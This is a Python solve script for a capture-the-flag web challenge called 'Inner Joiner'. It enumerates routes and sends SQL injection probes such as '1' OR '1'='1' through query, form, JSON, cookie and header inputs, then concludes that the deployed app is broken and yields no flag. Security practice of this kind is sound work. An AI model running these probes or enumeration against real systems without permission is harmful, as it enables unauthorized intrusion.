#!/usr/bin/env python3
"""Inner Joiner (WEB, 450) - http://54.72.82.22:8170

Reproduces the recon and demonstrates why the deployed app yields no flag.

Findings (all reproducible below):
  * `/` and every path except `/users` -> 404 (Go net/http "404 page not found").
  * `GET/POST/PUT/... /users` -> 500 with a raw MySQL driver error:
        Error 1054 (42S22): Unknown column 'name' in 'field list'
    i.e. the handler's SELECT list references a column `name` that does not
    exist in the live schema -> the ("retired") route is dead.
  * The route accepts NO input: query params, form/json/multipart bodies,
    cookies, arbitrary headers, path suffixes and matrix/encoded variants all
    leave the response byte-identical.  It is therefore not injectable.
  * No other route exists: exhaustively enumerated ~43k (raft-small) +
    ~119k (raft-large-words) + ~63k (raft-medium-words) + short/numeric path
    space + compound/extensioned variants, over GET and POST.

Run:  /home/nomad/safaricom_ctf/.venv/bin/python solve.py
"""
import sys
from concurrent.futures import ThreadPoolExecutor

import requests
import urllib3

urllib3.disable_warnings()
BASE = sys.argv[1] if len(sys.argv) > 1 else "http://54.72.82.22:8170"
S = requests.Session()
S.mount("http://", requests.adapters.HTTPAdapter(pool_connections=60, pool_maxsize=60))

GO_404 = "404 page not found"
SQL_ERR = "Unknown column 'name' in 'field list'"

# Small representative probe set (a full run uses raft/dirbuster wordlists).
PROBE = ["users", "user", "accounts", "orders", "products", "search", "query",
         "lookup", "directory", "join", "inner", "legacy", "old", "deprecated",
         "retired", "maintenance", "notes", "admin", "api", "api/users",
         "v1/users", "users/list", "users/all", "users/1", "lookup?name=1"]


def get(path, **kw):
    return S.get(BASE + path, timeout=8, allow_redirects=False, **kw)


def main():
    print(f"[*] target {BASE}")

    r = get("/")
    print(f"[*] GET /          -> {r.status_code} {r.text.strip()[:40]!r}")

    r = get("/users")
    print(f"[*] GET /users     -> {r.status_code} {r.text.strip()!r}")
    if SQL_ERR not in r.text:
        print("[!] /users no longer errors as expected; re-enumerate.")

    # 1. Is /users injectable at all?  Compare a full input surface to baseline.
    base_body = r.text
    probes = [
        ("query", lambda: S.get(BASE + "/users", params={"name": "1'"}, timeout=8)),
        ("query2", lambda: S.get(BASE + "/users", params={"id": "1' OR '1'='1"}, timeout=8)),
        ("form", lambda: S.post(BASE + "/users", data={"name": "1'"}, timeout=8)),
        ("json", lambda: S.post(BASE + "/users", json={"name": "1'"}, timeout=8)),
        ("multipart", lambda: S.post(BASE + "/users", files={"name": "1'"}, timeout=8)),
        ("cookie", lambda: S.get(BASE + "/users", cookies={"name": "1'"}, timeout=8)),
        ("header", lambda: S.get(BASE + "/users", headers={"X-Query": "1'"}, timeout=8)),
    ]
    changed = False
    for tag, fn in probes:
        try:
            rr = fn()
        except requests.RequestException:
            continue
        if rr.text != base_body:
            changed = True
            print(f"[+] INPUT CHANGED RESPONSE via {tag}: {rr.status_code} {rr.text[:80]!r}")
    if not changed:
        print("[*] /users ignores every input channel -> not injectable")
    # path-suffix injection is a distinct path (404), never reaching the query
    pr = S.get(BASE + "/users/1'", timeout=8)
    print(f"[*] GET /users/1'  -> {pr.status_code} {pr.text.strip()[:40]!r} (no route)")

    # 2. Route enumeration (representative; full run uses wordlists).
    def hit(p):
        try:
            rr = get("/" + p)
            if rr.status_code != 404:
                return (rr.status_code, "/" + p, rr.text[:80])
        except requests.RequestException:
            return None
        return None

    with ThreadPoolExecutor(max_workers=20) as ex:
        hits = [h for h in ex.map(hit, PROBE) if h]
    for code, p, body in hits:
        print(f"[*] route {code} {p} :: {body.strip()!r}")

    print("[!] Only /users exists, and its query is broken on an unknown column")
    print("    ('name'), masking any input.  NO FLAG (app inert as deployed).")


if __name__ == "__main__":
    main()
